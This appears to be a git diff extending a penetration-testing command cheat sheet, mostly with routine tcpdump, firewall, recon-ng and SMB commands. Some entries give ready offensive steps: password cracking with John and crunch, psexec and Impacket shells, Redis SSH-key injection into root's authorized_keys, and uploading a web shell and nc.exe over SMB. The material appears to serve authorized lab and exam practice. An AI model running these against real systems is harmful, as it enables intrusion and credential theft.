@@ -354,6 +354,55 @@ cd cheatsheet-pentesting
   ```bash
   tcpdump -i <interface> port 80
   ```
+- **Using tcpdump to read packet capture**:
+  ```bash
+  tcpdump -r <file>
+  sudo tcpdump -r password_cracking_filtered.pcap
+  ```
+
+- **Write Capture to File**:
+  ```bash
+  tcpdump -i <interface> -w capture.pcap
+  ```
+
+- **Using tcpdump to read the packet capture in hex/ascii output**:
+  ```bash
+  tcpdump -nX -r <file>
+  sudo tcpdump -nX -r password_cracking_filtered.pcap
+  ```
+- **Capture Traffic on an Interface**:
+  ```bash
+  tcpdump -i <interface>
+  ```
+
+- **Using tcpdump basic filters**:
+  ```bash
+  sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $5}' | sort | uniq -c | head
+  sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
+  sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
+  sudo tcpdump -n port 81 -r password_cracking_filtered.pcap
+  sudo tcpdump -nX -r password_cracking_filtered.pcap
+  ```
+  -n option to skip DNS name lookups and -r to read from our packet capture file
+  
+- **Using tcpdump with some advanced filtering**:
+  ```bash
+  echo "$((2#00011000))" --> 24
+  sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
+  ```
+  The ACK and PSH are represented by the fourth and fifth bits of the 14th byte, respectively.the tcpdump array index used for counting the bytes starts at zero, so the 
+  syntax should be (tcp[13]).
+  
+- **sniffing with tcpdump**:
+  ```bash
+  tcpdump -i <interface> -A
+  tcpdump -i lo -A
+  ```
+- **sniffing everything and saving to an output file**:
+  ```bash
+  tcpdump -i <interface> -w <output>
+  sudo tcpdump -i any -w os.pcap
+  ```
 ---
 ### GMSAPasswordReader
 - **Retrieve gMSA Password**:
@@ -789,13 +838,54 @@ cd cheatsheet-pentesting
 - **Generate Wordlist of Given Lengths**:
   ```bash
   crunch <min-length> <max-length> -o <output-file>
+  crunch 4 6 0123456789ABCDEF -o crunch.txt
   ```
 
 - **Generate Wordlist with Custom Characters**:
   ```bash
-  crunch <min-length> <max-length> -o <output-file> -p <charset>
+  crunch 8 8 -t ,@@^^%%%
+  #@	Lower case alpha characters
+  #,	Upper case alpha characters
+  #%	Numeric characters
+  #^	Special characters including space
   ```
-
+- **Generating password list of lower and upper case letters:**:
+  ```bash
+  crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
+  crunch 11 11  -f /usr/share/crunch/charset.lst lalpha -t  buddy%%%%^^ -o buddy.txt
+  ```
+- **Using Crunch to generate wordlist with the charset abc123 with word between 8 and 9 characters:**:
+  ```bash
+  crunch 8 9 abc123
+  ```
+- **Using Crunch to generate wordlist with starting with password and ending with three digits:**:
+  ```bash
+  crunch 11 11 -t password%%%
+  ```
+- **Using Crunch to generate wordlist starting with 'password' and ending with three digits - Alternate version:**:
+  ```bash
+  crunch 11 11 0123456789 -t password@@@
+  ```
+- **Using Crunch to generate wordlist using characters in 'abcde12345' without repeating any of them:**:
+  ```bash
+  crunch 1 1 -p abcde12345
+  ```
+- **Using Crunch to generate wordlist with multiple words instead of characters, without repeating them:**:
+  ```bash
+  crunch 1 1 -p dog cat bird
+  ```
+- **Using Crunch to generate wordlist with multiple words instead of characters, without repeating them and adding two digits:**:
+  ```bash
+  crunch 5 5 -t ddd%% -p dog cat bird
+  ```
+- **Using Crunch to generate a non-repeating wordlist from multiple words and adding two characters from a defined character set:**:
+  ```bash
+  crunch 5 5 aADE -t ddd@@ -p dog cat bird
+  ```
+- **Combining Crunch mangling and piping it to aircrack-ng:**:
+  ```bash
+  crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap -w -
+  ```
 ---
 
 ### curl
@@ -1383,6 +1473,7 @@ cd cheatsheet-pentesting
 - **List Rules**:
   ```bash
   iptables -L
+  sudo iptables -vn -L
   ```
 
 - **Add a Rule to Accept Traffic on a Port**:
@@ -1394,17 +1485,111 @@ cd cheatsheet-pentesting
   ```bash
   iptables -A INPUT -s <IP_address> -j DROP
   ```
+- **Setting Default Forward Policy to Drop: **:
+  ```bash
+  sudo iptables -P FORWARD DROP
+  ```
+  This drops all traffic through the forward chain unless explicitly allowed by specific rules.
+- **Adding Rules to Accept or Block Traffic**:
+  ```bash
+  sudo iptables -s 192.168.1.0/24 -p all -A INPUT
+  ```
+  This allows all types of traffic (-p all) from the subnet 192.168.1.0/24 to the INPUT chain.
+- **Allowing traffic from the local machine:**:
+  ```bash
+  sudo iptables -s 127.0.0.1 -d 127.0.0.1 -A INPUT
+  ```
+  This rule only allows traffic between the local machine (localhost) and itself.
+
+- **Allowing traffic from a specific IP address (e.g., 192.168.1.37):**:
+  ```bash
+  sudo iptables -s 192.168.1.37 -p tcp -A INPUT
+  ```
+- **Show Rules with Line Numbers**:
+  ```bash
+  sudo iptables -L --line-numbers
+  ```
+- **Inserting Rules at Specific Line Numbers:**:
+  ```bash
+  sudo iptables -s 192.168.1.37 -I INPUT 1
+  ```
+- **Inserting a rule based on connection state (for established connections):**:
+  ```bash
+  sudo iptables -I INPUT 1 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+  ```
+- **Inserting a rule to block invalid packets:**:
+  ```bash
+  sudo iptables -I INPUT 2 -m conntrack --ctstate INVALID -j DROP
+  ```
+- **Rule Replacement and Removal:**:
+  ```bash
+  sudo iptables -R INPUT 2 -s 192.168.1.0/24 -j DROP
+  ```
+  This replaces the second rule in the INPUT chain to drop traffic from the 192.168.1.0/24 subnet.
+- **Reset Packet and Byte Counters:**:
+  ```bash
+  sudo iptables -Z
+  ```
+- **Configuring Rules for Nmap Scans:**:
+  ```bash
+  sudo iptables -I INPUT 1 -s 10.11.1.220 -j ACCEPT
+  sudo iptables -I OUTPUT 1 -d 10.11.1.220 -j ACCEPT
+  ```
+  Allowing incoming and outgoing traffic from the Nmap scanner
+
 ---
 ### John
 - **Run John the Ripper on a Password File**:
   ```bash
   john <password_file>
+  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
   ```
 
 - **Show Cracked Passwords**:
   ```bash
   john --show <password_file>
   ```
+- **Creating mutation rule in John the Ripper configuration file**:
+  ```bash
+  sudo nano /etc/john/john.conf
+  nano> ([List.Rules:Wordlist])
+  nano> $[0-9]$[0-9]
+  john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
+  ```
+- **Cracking using password mutation rules**:
+  ```bash
+  john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
+  ```
+- **Cracking /etc/shadow File**:
+  ```bash
+  unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
+  john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+  
+  ```
+- **Cracking WordPress (WP) Password Hash**:
+  ```bash
+  echo '$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/' > pass.txt
+  john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
+  
+  ```
+- **Cracking GPG Private Key**:
+  ```bash
+  gpg2john creds.priv > creds4john
+  john creds4john --wordlist=/usr/share/wordlists/rockyou.txt
+  ```
+- **Cracking JSON Web Token (JWT) Secret Key**:
+  ```bash
+  john jwt.txt --wordlist=rockyou.txt
+  ```
+- **Cracking Windows Password Hashes**:
+  ```bash
+  john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=NT
+  ```
+- **Searching for Passwords in John the Ripper Wordlist**:
+  ```bash
+  grep -i password /usr/share/john/password.lst
+  ```
+
 ---
 ### Kerberoast
 - **Request a Service Ticket**:
@@ -1688,6 +1873,45 @@ cd cheatsheet-pentesting
   ```cmd
   netsh wlan export profile name="<profile_name>" key=clear folder=<output_folder>
   ```
+- **Viewing the firewall settings for all profiles (Domain, Private, Public):**:
+  ```cmd
+  netsh advfirewall show allprofiles
+  ```
+
+- **Add Firewall Rules: Blocking incoming ping requests from a specific IP**:
+  ```cmd
+  netsh advfirewall firewall add rule name="Deny Ping OffSec" dir=in action=block protocol=icmpv4 remoteip=192.124.249.5
+  ```
+- **Showing a specific rule:**:
+  ```cmd
+  netsh advfirewall firewall show rule name="Deny Ping OffSec"
+  ```
+
+- **Deleting a specific rule:**:
+  ```cmd
+  netsh advfirewall firewall delete rule name="Deny Ping OffSec"
+  ```
+- **Blocking outbound traffic to a specific IP:**:
+  ```cmd
+  netsh advfirewall firewall add rule name="Block OffSec" remoteip=192.124.249.5 dir=out enable=yes action=block
+  ```
+
+- **Block outbound TCP traffic to a specific IP and port (443):**:
+  ```cmd
+  netsh advfirewall firewall add rule name="Block OffSec" remoteip=192.124.249.5 dir=out enable=yes action=block remoteport=443 protocol=tcp
+  ```
+- **Local Port Forwarding Using netsh and Listing/Mounting the remote share available on the Windows 2016 Server machine through a port forward and**:
+  ```cmd
+  netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
+  sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Tester,password=password /mnt/win10_share ls -l /mnt/win10_share/ 
+  smbclient -L 10.11.0.22 --port=4455 --user=Administrator
+  ```
+  This command forwards traffic that is sent to port 4455 on 10.11.0.22 to port 445 on 192.168.1.110
+- ** Allowing Inbound Traffic on a Specific Port**:
+  ```cmd
+  netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
+  ```
+
 ---
 ### Netstat
 - **Show All Connections**:
@@ -1865,6 +2089,35 @@ cd cheatsheet-pentesting
 - **Execute a Command on a Remote Host**:
   ```cmd
   psexec \\<host> -u <username> -p <password> <command>
+  psexec \\192.168.50.80 -u tester -p password ipconfig
+  ```
+
+- **Run Interactive Shell**:
+  ```cmd
+  psexec \\<host>
+  ```
+- **Running Command on Specific User Session:**:
+  ```cmd
+  psexec -i \\myComputer cmd /c "systeminfo"
+  ```
+
+- **Running Command as Different User:**:
+  ```cmd
+  psexec -i \\myComputer -u username -p password cmd
+  ```
+- **onnecting to Domain Controller (DC/Windows)**:
+  ```cmd
+  .\PsExec.exe /accepteula \\dc01 cmd.exe
+  ```
+
+- **Running Impacket PsExec Example**:
+  ```cmd
+  /usr/bin/impacket-psexec "username:password"@192.168.205.59 cmd.exe
+  ```
+- **Gaining System Shell Using Impacket:**:
+  ```cmd
+  python3 /usr/share/doc/python3-impacket/examples/psexec.py pc.domain/tester:password@192.168.120.116
+  /usr/share/doc/python3-impacket/examples/psexec.py admin@10.129.254.45
   ```
 
 - **Run Interactive Shell**:
@@ -1898,10 +2151,32 @@ cd cheatsheet-pentesting
   recon-ng
   ```
 
+- **Searching the Marketplace for Modules(GitHub):**:
+  ```bash
+  marketplace search github
+  ```
+- **Getting Information on a Module:**:
+  ```bash
+  marketplace info recon/domains-hosts/google_site_web
+  ```
+
 - **Load a Module**:
   ```bash
   use <module>
+  modules load recon/domains-hosts/google_site_web
   ```
+- **Installing a Module**:
+  ```bash
+  marketplace install recon/domains-hosts/google_site_web
+  ```
+
+- **#Using recon/domains-hosts/google_site_web and setting the source**:
+  ```bash
+  modules load recon/domains-hosts/google_site_web
+  info
+  options set SOURCE megacorpone.com
+  ```
+
 
 ### Redis
 - **Connect to Redis CLI**:
@@ -1912,6 +2187,28 @@ cd cheatsheet-pentesting
 - **Flush All Data**:
   ```bash
   redis-cli FLUSHALL
+  ```
+- **Injecting SSH Public Key into Redis**:
+  ```bash
+  ssh-keygen -t rsa
+  (echo -e "\n\n"; cat key.pub ; echo -e "\n\n") > key.txt
+  cat key.txt | redis-cli -h 127.0.0.1 -a 'sgm5ZgaRCTOE6QpyCojpyr+Rix12VYbdOkA' -x set s-key
+  
+  ```
+
+- **Update Redis Configuration to Allow SSH Key Injection:**:
+  ```bash
+  redis-cli -h 127.0.0.1 -a 'sgm5ZgaRCTOE6QpyCojpyr+Rix12VYbdOkA' 
+  127.0.0.1:6379> config get dir
+  2) "/var/redis/6379"
+  127.0.0.1:6379> config set dir /root/.ssh
+  OK
+  127.0.0.1:6379> CONFIG SET dbfilename authorized_keys
+  OK
+  127.0.0.1:6379> save
+  OK
+  --> exit
+  ssh root@192.168.120.51 -i key
   ```
 
 ### Reg
@@ -2193,6 +2490,48 @@ cd cheatsheet-pentesting
   ```
 
 ### Smbclient
+- **Connect to an SMB Share(Windows/Linux)**:
+  ```bash
+  smbclient //<server>/<share>
+  smbclient //192.168.120.116/DocumentsShare -U username
+  smbclient -U 'username%password' //192.168.155.175/Password\ Audit
+  smbclient \\\\10.129.255.88\\backups -U user
+
+  ```
+
+- **Listing SMB Shares**:
+  ```bash
+  smbclient -L <target_ip> -U <username>
+  smbclient -L \\192.168.155.175 -U 'username%password'
+  smbclient -N -L 192.168.120.116
+  ```
+- **Updating SMB Protocol to SMBv2**:
+  ```bash
+  sudo nano /etc/samba/smb.conf
+  min protocol = SMB2
+  sudo /etc/init.d/smbd restart
+  
+  ```
+
+- **Recursive File Download with SMB**:
+  ```bash
+  smbclient -U 'username%password' //192.168.155.175/Password\ Audit
+  smb: \> prompt off
+  smb: \> recurse on
+  smb: \> mget *
+  ```
+- **Uploading a Web Shell and Executables**:
+  ```bash
+    smbclient -U 'username%password' //192.168.155.175/Password\ Audit
+    smb: \> put shell.php
+    smb: \> put nc.exe
+    smb: \> exit
+  ```
+
+- **Download a File**:
+  ```bash
+  get <file_name>
+  ```
 - **Connect to an SMB Share**:
   ```bash
   smbclient //<server>/<share>
